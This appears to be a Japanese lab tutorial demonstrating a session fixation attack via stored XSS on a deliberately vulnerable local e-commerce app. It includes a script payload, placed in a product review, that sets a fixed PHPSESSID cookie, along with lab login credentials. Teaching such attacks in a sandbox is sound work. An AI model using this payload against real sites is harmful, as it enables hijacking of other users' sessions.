### 脆弱性の悪用
#### 脆弱なアプリケーションの起動

画面右下のターミナルで`docker-compose`と入力し，アプリケーションを立ち上げましょう．  
その後，画面右上の疑似ブラウザの更新ボタンを押すと脆弱なアプリケーションが表示されます。

#### 攻撃
XSSの存在するページではこの二つの攻撃が容易に行えます。
この攻撃の再現では、ECサイトをもした、XSSの存在するログインを利用し体験してもらいます。

**セッション固定化攻撃**
1.ユーザー```guest```でログインを行なってください。
```
LoginID : guest
Pssword : guest_password
```

2.```http://localhost/product.php?id=1```へ移動し、レビューに下のscriptを書き込みます。
```html
<script>document.cookie='PHPSESSID=abcd;'</script>
```

3.ユーザー```admin```でLoginを行います。
```
LoginID : admin
Pssword : Adm1n_paSsw0Rd
```

4.固定されたCookieを用いてアクセスをします。
Ex) cookieの変更方法
 -  developerToolsを利用した方法
 Windows:Mac共通 : F12 ボタン
 Mac            : commando + option + i
 手順
  developerToolsを開く → Application → Cookies → URL → PHPSESSIDを先ほど設定したものに変更
 [![developerToolsを利用した方法](https://gyazo.com/865a5d0cf15a2abaa003fcdfb6bb4fe6)](https://gyazo.com/865a5d0cf15a2abaa003fcdfb6bb4fe6)

これでAdminでLoginできたら攻撃の成功です。
